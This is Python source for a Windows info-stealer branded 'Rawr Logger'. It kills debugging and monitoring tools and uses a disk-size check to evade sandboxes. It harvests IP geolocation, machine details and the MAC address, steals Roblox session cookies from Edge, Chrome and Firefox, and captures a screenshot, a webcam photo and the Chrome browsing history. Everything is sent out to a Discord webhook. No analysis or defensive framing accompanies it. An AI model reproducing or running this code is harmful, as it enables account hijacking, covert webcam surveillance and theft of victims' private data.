import os
import requests
import socket
import threading
import platform
import json
import psutil
import sys
import win32api
import browser_cookie3
import cv2
import re
import uuid
from PIL import ImageGrab
from browser_history.browsers import Chrome

webhook = "Webhooksss"
process = [
    "ProcessHacker.exe",
    "httpdebuggerui.exe",
    "wireshark.exe",
    "HttpAnalyzerV7.exe",
    "fiddler.exe",
    "taskmgr.psutilexe",
    "regedit.exe",
    "cmd.exe",
    "taskmgr.exe",
    "vboxservice.exe",
    "ollydbg.exe",
    "dnSpy.exe",
    "procexp64.exe",
    "procexp.exe"
]

# Kill specified processes
for proc in psutil.process_iter():
    if proc.name() in process:
        proc.kill()

minDiskSizeGB = 50
if len(sys.argv) > 1:
    minDiskSizeGB = float(sys.argv[1])

_, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
diskSizeGB = diskSizeBytes / 1073741824

if diskSizeGB < minDiskSizeGB:
    try:
        embedss = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {
                        "name": "Rawr Logger",
                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Insufficient Disk Space Detected```",
                }
            ]
        }
        requests.post(webhook, json=embedss)
        os._exit(1)
    except Exception as e:
        pass

machines = platform.uname()
ips = requests.get('https://api.ipify.org').text
info = requests.get("http://ipinfo.io/json").json()
city = info['city']
country = info['country']
region = info['region']
lang = info['loc']
post = info['postal']
timezone = info['timezone']
org = info['org']
pc_username = os.getenv("UserName")

embed = {
    "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
    "embeds": [
        {
            "author": {
                "name": "Rawr Logger",
                "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
            },
            "description": f" @everyone You Got A Hit ```There Public Ip Is: {ips}``` ```There City Is: {city}``` ```There Country Is: {country}``` ```There Region Is: {region}``` ```There Lang is: {lang}```  ```There Postal Code Is: {post}``` ```There Organzation Is: {org}```  ```There Pc Username Is: {pc_username}``` ```There Pc Machine Name Is: {machines.machine}``` ```There Pc Processer Is: {machines.processor}``` ```There Pc Mac Address Is : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
        }
    ]
}

requests.post(webhook, json=embed)

def edge():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
                "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                "embeds": [
                    {
                        "author": {
                            "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                        },
                        "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",
                        "footer": {
                            "text": "Rawr Logger Made By Jose And The Soap1"
                        }
                    }
                ]
            }
            requests.post(webhook, json=embedss)
    except Exception as e:
        embedssa = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {
                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Edge Cookie Was Not Found```",
                }
            ]
        }
        requests.post(webhook, json=embedssa)

def chromes():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
                "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                "embeds": [
                    {
                        "author": {
                            "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                        },
                        "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",
                        "footer": {
                            "text": "Rawr Logger Made By Jose And The Soap1"
                        }
                    }
                ]
            }
            requests.post(webhook, json=embedss)
    except Exception as e:
        embedsss = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {
                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Google Chrome Cookie Was Not Found```",
                }
            ]
        }
        requests.post(webhook, json=embedsss)

def firefoxs():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
                "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                "embeds": [
                    {
                        "author": {
                            "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                        },
                        "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",
                        "footer": {
                            "text": "Rawr Logger Made By Jose And The Soap1"
                        }
                    }
                ]
            }
            requests.post(webhook, json=embedss)
    except Exception as e:
        embeded = {
            "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {
                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Fire Fox Cookie Was Not Found```",
                }
            ]
        }
        requests.post(webhook, json=embeded)

browsers = [firefoxs, edge, chromes]
for i in browsers:
    threading.Thread(target=i).start()

# Take screenshot
screenshot = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
screenshot.save("image.png")
screenshot.close()
with open('image.png', 'rb') as f:
    requests.post(webhook, files={'upload_file': f})
os.remove('image.png')

# Capture webcam image
try:
    videoCaptureObject = cv2.VideoCapture(0)
    ret, frame = videoCaptureObject.read()
    cv2.imwrite("photo.png", frame)
    result = False
    with open('photo.png', 'rb') as f:
        requests.post(webhook, json={'content': f'Picture Of There Webcam:'})
        requests.post(webhook, files={'upload_file': f})
    os.remove('photo.png')
except Exception as e:
    embeded = {
        "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
        "embeds": [
            {
                "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                },
                "description": f"```No Webcam Was Found```",
            }
        ]
    }
    requests.post(webhook, json=embeded)

# Fetch Chrome history
try:
    file = Chrome()
    outputs = file.fetch_history()
    with open("history.txt", "w") as f:
        str_output = repr(outputs.histories)
        f.write(str_output)

    with open('history.txt', 'rb') as f:
        requests.post(webhook, json={'content': 'There Chrome History'})
        requests.post(webhook, files={'upload_file': f})
    os.remove('history.txt')
except Exception as e:
    embeded = {
        "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
        "embeds": [
            {
                "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                },
                "description": f"```Failed To Grab Chromes Browser History```",
            }
        ]
    }
    requests.post(webhook, json=embeded)
